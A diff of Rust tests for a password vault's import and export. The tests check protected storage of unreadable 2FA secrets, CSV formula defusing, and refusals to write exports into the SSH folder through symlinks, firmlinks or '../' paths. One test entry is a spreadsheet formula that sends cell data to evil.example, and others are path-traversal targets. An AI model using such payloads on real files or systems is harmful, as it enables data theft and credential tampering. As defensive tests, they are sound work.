@@ -7,7 +7,7 @@ use secrecy::{ExposeSecret, SecretString};
 use tempfile::TempDir;
 
 use super::*;
-use crate::vault::{EntryInput, SecretField, VaultPaths, export_kdbx};
+use crate::vault::{EntryInput, SecretField, VaultPaths};
 
 struct Fixture {
     dir: TempDir,
@@ -358,16 +358,14 @@ fn import_adds_the_chosen_rows_into_folders() {
     assert!(otp.expose_secret().contains(TOTP_SECRET));
     let password = fx.vault.secret(&prod.id, SecretField::Password).unwrap();
     assert_eq!(password.expose_secret(), "prod-pass");
-    // An unreadable 2FA secret is kept in the notes.
+    // An unreadable 2FA secret is kept, protected, but never reaches the UI.
     let steam = find(&fx.vault, "Steam");
     assert!(!steam.has_otp);
-    assert!(
-        fx.vault
-            .entry(&steam.id)
-            .unwrap()
-            .notes
-            .contains("steam://ABCDE")
-    );
+    let detail = fx.vault.entry(&steam.id).unwrap();
+    assert!(!format!("{detail:?}").contains("steam://"));
+    let field = fx.vault.find(&steam.id).unwrap();
+    assert_eq!(field.get(UNREADABLE_OTP_FIELD), Some("steam://ABCDE"));
+    assert!(field.fields[UNREADABLE_OTP_FIELD].is_protected());
 
     // The changes are saved like any other.
     fx.vault.save(&fx.dir.path().join("backups")).unwrap();
@@ -555,12 +553,124 @@ fn csv_export_over_an_existing_file_makes_it_private() {
 }
 
 #[test]
+fn csv_export_defuses_formulas_but_keeps_passwords_exact() {
+    let mut fx = Fixture::new();
+    fx.vault
+        .add_entry(&EntryInput {
+            title: "=IMPORTXML(\"https://evil.example/?\"&C2,\"//a\")".into(),
+            username: "+998901234567".into(),
+            password: Some(s("-starts-with-a-dash")),
+            url: "@SUM(1)".into(),
+            ..EntryInput::default()
+        })
+        .unwrap();
+    let target = fx.dir.path().join("export.csv");
+    fx.vault
+        .export_csv(&s("master"), &target, &fx.ssh_dir())
+        .unwrap();
+    let text = fs::read_to_string(&target).unwrap();
+    let row = text.lines().nth(1).unwrap();
+    assert!(row.contains("\"'=IMPORTXML("), "{row}");
+    // A phone number runs nothing, and keeps its exact value elsewhere.
+    assert!(row.contains("\"+998901234567\""), "{row}");
+    assert!(row.contains("\"'@SUM(1)\""), "{row}");
+    assert!(row.contains("\"-starts-with-a-dash\""), "{row}");
+}
+
+#[test]
+fn csv_import_takes_off_the_exports_formula_guard() {
+    assert_eq!(without_formula_guard("'=IMPORTXML(A1)"), "=IMPORTXML(A1)");
+    assert_eq!(without_formula_guard("'@SUM(1)"), "@SUM(1)");
+    for cell in ["'quoted", "it's", "''", "=x"] {
+        assert_eq!(without_formula_guard(cell), cell);
+    }
+}
+
+#[test]
+fn csv_export_writes_unreadable_2fa_secrets_back_to_the_totp_column() {
+    let mut fx = Fixture::new();
+    let path = fx.csv(
+        "steam.csv",
+        "name,url,username,password,totp\nSteam,https://steam.example,me,pw,steam://ABCDE\n",
+    );
+    let preview = fx.vault.import_preview(&path).unwrap();
+    assert!(!preview.rows[0].has_otp && preview.rows[0].has_unreadable_otp);
+    fx.vault.import_csv(&path, &[0]).unwrap();
+    let target = fx.dir.path().join("export.csv");
+    fx.vault
+        .export_csv(&s("master"), &target, &fx.ssh_dir())
+        .unwrap();
+    assert!(
+        fs::read_to_string(&target)
+            .unwrap()
+            .contains("\"steam://ABCDE\"")
+    );
+}
+
+/// `/System/Volumes/Data/…` is the same folder as `/…` on macOS: a path
+/// through it must not lead into `~/.ssh` or over the vault.
+#[cfg(target_os = "macos")]
+#[test]
+fn exports_see_through_macos_firmlinks() {
+    let fx = sample_vault();
+    let ssh = fs::canonicalize(fx.ssh_dir()).unwrap();
+    let firmlinked =
+        |path: &Path| Path::new("/System/Volumes/Data").join(path.strip_prefix("/").unwrap());
+    let via_data = firmlinked(&ssh);
+    if !via_data.is_dir() {
+        return;
+    }
+    let target = via_data.join("id_ed25519");
+    let error = fx
+        .vault
+        .export_csv(&s("master"), &target, &ssh)
+        .unwrap_err();
+    assert!(matches!(error, Error::InvalidInput(_)));
+    assert!(!ssh.join("id_ed25519").exists());
+    let database = firmlinked(&fs::canonicalize(&fx.vault.paths().database).unwrap());
+    let error = fx
+        .vault
+        .export_kdbx(&s("master"), &database, &ssh)
+        .unwrap_err();
+    assert!(matches!(error, Error::InvalidInput(_)));
+}
+
+#[test]
+fn csv_export_never_goes_into_a_link_to_the_ssh_folder() {
+    let fx = sample_vault();
+    let ssh = fx.ssh_dir();
+    #[cfg(unix)]
+    {
+        let link = fx.dir.path().join("dotfiles");
+        std::os::unix::fs::symlink(&ssh, &link).unwrap();
+        let error = fx
+            .vault
+            .export_csv(&s("master"), &link.join("config"), &ssh)
+            .unwrap_err();
+        assert!(matches!(error, Error::InvalidInput(_)));
+    }
+    let sneaky = fx.dir.path().join("sub");
+    fs::create_dir(&sneaky).unwrap();
+    let error = fx
+        .vault
+        .export_csv(&s("master"), &sneaky.join("../.ssh/config"), &ssh)
+        .unwrap_err();
+    assert!(matches!(error, Error::InvalidInput(_)));
+    assert!(!ssh.join("config").exists());
+}
+
+#[test]
 fn kdbx_export_is_a_copy_that_opens_with_the_recovery_key() {
     let fx = sample_vault();
     let paths = fx.vault.paths().clone();
     let target = fx.dir.path().join("copy.kdbx");
     let ssh = fx.ssh_dir();
-    export_kdbx(&paths, &target, &ssh).unwrap();
+    assert!(matches!(
+        fx.vault.export_kdbx(&s("wrong"), &target, &ssh),
+        Err(Error::WrongPassphrase)
+    ));
+    assert!(!target.exists());
+    fx.vault.export_kdbx(&s("master"), &target, &ssh).unwrap();
     assert_eq!(
         fs::read(&target).unwrap(),
         fs::read(&paths.database).unwrap()
@@ -571,13 +681,15 @@ fn kdbx_export_is_a_copy_that_opens_with_the_recovery_key() {
 
     for own in [&paths.database, &paths.keys, &ssh.join("config")] {
         assert!(matches!(
-            export_kdbx(&paths, own, &ssh).unwrap_err(),
+            fx.vault.export_kdbx(&s("master"), own, &ssh).unwrap_err(),
             Error::InvalidInput(_)
         ));
     }
     assert!(!ssh.join("config").exists());
     assert!(matches!(
-        export_kdbx(&paths, Path::new("relative.kdbx"), &ssh).unwrap_err(),
+        fx.vault
+            .export_kdbx(&s("master"), Path::new("relative.kdbx"), &ssh)
+            .unwrap_err(),
         Error::InvalidInput(_)
     ));
 }
